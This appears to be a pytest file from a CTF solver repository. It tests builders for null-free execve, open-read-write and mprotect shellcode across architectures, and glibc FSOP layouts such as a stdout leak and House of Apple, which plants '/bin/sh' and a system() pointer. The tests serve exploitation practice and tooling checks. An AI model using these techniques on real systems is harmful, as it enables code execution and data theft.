"""Synthetic offline coverage for syscall-aware shellcode and FSOP layout builders."""
from __future__ import annotations

import json
import struct
import sys
from pathlib import Path

import pytest


REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO / "solvers" / "toolkits"))
import pwn_fsop as fsop  # noqa: E402
import pwn_shellcode as shellcode  # noqa: E402


def qword(data: bytes, offset: int) -> int:
    return struct.unpack_from("<Q", data, offset)[0]


def dword(data: bytes, offset: int) -> int:
    return struct.unpack_from("<I", data, offset)[0]


@pytest.mark.parametrize("arch", shellcode.ARCHES)
def test_execve_is_null_free_on_every_supported_architecture(arch):
    result = shellcode.build_shellcode("execve", arch, avoid={0})
    assert result.arch == arch
    assert result.kind == "execve"
    assert result.syscalls == ("execve",)
    assert result.syscall_numbers == (shellcode._syscalls(arch)["execve"],)
    assert result.raw and b"\x00" not in result.raw
    assert "bytes.fromhex" in result.pwntools
    assert result.raw.hex() in result.pwntools


@pytest.mark.parametrize("arch", shellcode.ARCHES)
def test_orw_builds_arch_specific_open_route_and_embeds_only_requested_path(arch):
    allowed = ["openat", "read", "write"]
    result = shellcode.build_shellcode("orw", arch, allowed_syscalls=allowed, path="/flag.round3")
    assert result.kind == "orw"
    assert result.syscalls == ("openat", "read", "write")
    assert b"/flag.round3\x00" in result.raw
    assert b"/bin/sh" not in result.raw
    assert result.variant.startswith("openat-")
    assert set(result.syscall_numbers) == {
        shellcode._syscalls(arch)[name] for name in ("openat", "read", "write")
    }


def test_seccomp_allowlist_falls_back_from_execve_to_orw_and_missing_route_refuses():
    report = {"arch": "amd64", "allowed": ["openat", "read", "write"],
              "denied": ["execve"], "verdict": "execve blocked → ORW"}
    result = shellcode.build_shellcode("execve", "amd64", avoid={0, 10},
                                       allowed_syscalls=report, path="/flag")
    assert result.requested_kind == "execve"
    assert result.kind == "orw"
    assert result.syscalls == ("openat", "read", "write")
    assert result.notes == ("execve blocked by supplied allowlist; emitted ORW instead",)
    assert not (set(result.raw) & {0, 10})
    assert b"/flagX" in result.raw
    assert "self-terminating-path" in result.variant

    with pytest.raises(shellcode.ShellcodeError, match="no complete ORW"):
        shellcode.build_shellcode("execve", "amd64", allowed_syscalls=["read", "write"])


def test_bad_byte_and_syscall_constraints_never_return_a_violating_candidate():
    with pytest.raises(shellcode.ShellcodeError, match="avoids byte"):
        shellcode.build_shellcode("execve", "amd64", avoid={0x0F})
    with pytest.raises(shellcode.ShellcodeError, match="mprotect"):
        shellcode.build_shellcode("mprotect_stager", "i386", allowed_syscalls=["read", "write"])
    with pytest.raises(shellcode.ShellcodeError, match="31 bytes"):
        shellcode.build_shellcode("orw", "arm", avoid={0}, path="/" + "a" * 40)


@pytest.mark.parametrize("arch", shellcode.ARCHES)
def test_mprotect_stager_declares_only_mprotect_and_is_bounded(arch):
    result = shellcode.build_shellcode("mprotect_stager", arch, allowed_syscalls=["mprotect"])
    assert result.syscalls == ("mprotect",)
    assert 16 <= len(result.raw) <= 64
    assert result.variant == "current-stack-page-rwx"


def test_shellcode_guarded_cli_json_and_garbage(capsys):
    assert shellcode.main(["execve", "amd64", "--avoid", "00,0a", "--json"]) == 0
    result = json.loads(capsys.readouterr().out)
    assert result["kind"] == "execve"
    assert result["length"] == len(bytes.fromhex(result["raw_hex"]))

    assert shellcode.main(["orw", "not-an-arch"]) == 2
    captured = capsys.readouterr()
    assert captured.err.startswith("pwn_shellcode: ")
    assert "Traceback" not in captured.err


def test_stdout_leak_layout_places_exact_interval_and_real_vtable():
    result = fsop.build_fsop(
        "stdout_leak", "2.37", file_addr=0x404800,
        leak_start=0x401000, leak_end=0x401120,
        lock=0x405000, io_file_jumps=0x7FFFF7FA0000,
    )
    data = result.segments[0].data
    assert result.strategy == "stdout-write-window"
    assert dword(data, fsop.FILE_OFFSETS["flags"]) == 0xFBAD1800
    assert qword(data, fsop.FILE_OFFSETS["write_base"]) == 0x401000
    assert qword(data, fsop.FILE_OFFSETS["write_ptr"]) == 0x401120
    assert dword(data, fsop.FILE_OFFSETS["fileno"]) == 1
    assert qword(data, fsop.FILE_OFFSETS["lock"]) == 0x405000
    assert qword(data, fsop.FILE_OFFSETS["vtable"]) == 0x7FFFF7FA0000
    assert result.blob == data


def test_hookless_house_of_apple_serializes_file_wide_data_and_call_slot():
    result = fsop.build_fsop(
        "house_of_apple", "2.35",
        file_addr=0x404800, wide_data_addr=0x404900, wide_vtable_addr=0x404A00,
        lock=0x404B00, system=0x7FFFF7E12340, io_wfile_jumps=0x7FFFF7FA10C0,
        command="  /bin/sh",
    )
    assert result.strategy == "hookless-house-of-apple"
    assert len(result.segments) == 3
    file_data, wide_data, wide_vtable = [segment.data for segment in result.segments]
    assert file_data.startswith(b"  /bin/sh\x00")
    assert qword(file_data, fsop.FILE_OFFSETS["write_base"]) == 0
    assert qword(file_data, fsop.FILE_OFFSETS["write_ptr"]) == 1
    assert qword(file_data, fsop.FILE_OFFSETS["wide_data"]) == 0x404900
    assert dword(file_data, fsop.FILE_OFFSETS["mode"]) == 1
    assert qword(file_data, fsop.FILE_OFFSETS["vtable"]) == 0x7FFFF7FA10C0
    assert qword(wide_data, fsop.WIDE_OFFSETS["write_base"]) == 0
    assert qword(wide_data, fsop.WIDE_OFFSETS["write_ptr"]) == 1
    assert qword(wide_data, fsop.WIDE_OFFSETS["wide_vtable"]) == 0x404A00
    assert qword(wide_vtable, 0x68) == 0x7FFFF7E12340
    assert result.blob_address == 0x404800
    assert result.blob is not None
    assert "no malloc/free hook" in result.notes[0]


def test_glibc_version_switch_and_overlapping_segments_refuse():
    legacy = fsop.build_fsop(
        "house_of_apple", "2.23", file_addr=0x404800, vtable_addr=0x404900,
        lock=0x404A00, system=0x7FFFF7E12340,
    )
    assert legacy.strategy == "legacy-unvalidated-vtable"
    assert qword(legacy.segments[0].data, fsop.FILE_OFFSETS["vtable"]) == 0x404900
    assert qword(legacy.segments[1].data, 0x18) == 0x7FFFF7E12340

    validated = fsop.build_fsop(
        "house_of_apple", "2.33", file_addr=0x404800, wide_data_addr=0x404900,
        wide_vtable_addr=0x404A00, lock=0x404B00, system=0x7FFFF7E12340,
        io_wfile_jumps=0x7FFFF7FA10C0,
    )
    assert validated.strategy == "validated-wide-vtable"

    with pytest.raises(fsop.FSOPError, match="overlap"):
        fsop.build_fsop(
            "house_of_apple", "2.35", file_addr=0x404800, wide_data_addr=0x404850,
            wide_vtable_addr=0x404900, lock=0x404B00, system=0x7FFFF7E12340,
            io_wfile_jumps=0x7FFFF7FA10C0,
        )


def test_fsop_guarded_cli_and_bad_json(tmp_path, capsys):
    config = tmp_path / "fsop.json"
    config.write_text(json.dumps({
        "glibc_version": "2.37", "file_addr": 0x404800,
        "leak_start": 0x401000, "leak_end": 0x401010,
        "lock": 0x405000, "io_file_jumps": 0x7FFFF7FA0000,
    }), encoding="utf-8")
    assert fsop.main(["stdout_leak", str(config), "--json"]) == 0
    output = json.loads(capsys.readouterr().out)
    assert output["segments"][0]["length"] == fsop.FILE_PLUS_SIZE

    bad = tmp_path / "bad.json"
    bad.write_bytes(b"not json\xff")
    assert fsop.main(["house_of_apple", str(bad)]) == 2
    captured = capsys.readouterr()
    assert captured.err.startswith("pwn_fsop: ")
    assert "Traceback" not in captured.err

